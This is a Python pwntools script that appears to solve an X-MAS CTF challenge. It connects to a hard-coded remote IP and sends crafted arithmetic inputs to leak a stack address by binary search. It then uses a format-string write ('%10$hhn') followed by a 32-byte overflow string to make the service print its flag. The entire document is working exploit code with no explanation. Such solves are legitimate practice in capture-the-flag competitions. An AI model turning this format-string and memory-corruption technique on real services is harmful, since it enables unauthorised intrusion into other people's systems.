from pwn import *

init = [
    '2147221504 + 2147221504 #',
    '!+!+!+!+!+!+!+!#',
    '!+!+!+!+!+!+!+!#',
    '!+!+!+!+!+!+!+!#',
    '!+!+!+!+!+!+!+!#',
    '!+!+!+!+!+!+!+!#'
]

def get(s):
    p.sendline(s)
    p.recvuntil('RESULT ')
    return int(p.recvline(False))

base = 0x00007ffc00000000
l = 0
r = 2**31 - 1

while True:
    p = remote('199.247.6.180', 10009)
    for line in init:
        p.sendline(line)
        p.recvuntil(line)
    in_bound = get('!+%d<@' % l) and get('!+%d > @' % r)
    if in_bound:
        break
    p.close()

while l != r:
    m = (l + r) // 2
    if get('!+%d<@' % m):
        l = m + 1
    else:
        r = m

log.info('buf = %x' % (base + l))
p.sendline('!+%d+31 %%10$hhn' % l)
p.recvuntil('Santa hates those big numbers...\n')
p.sendline('a' * 32)
p.recvuntil('X-MAS')
print 'X-MAS' + p.recvuntil('}')
p.close()
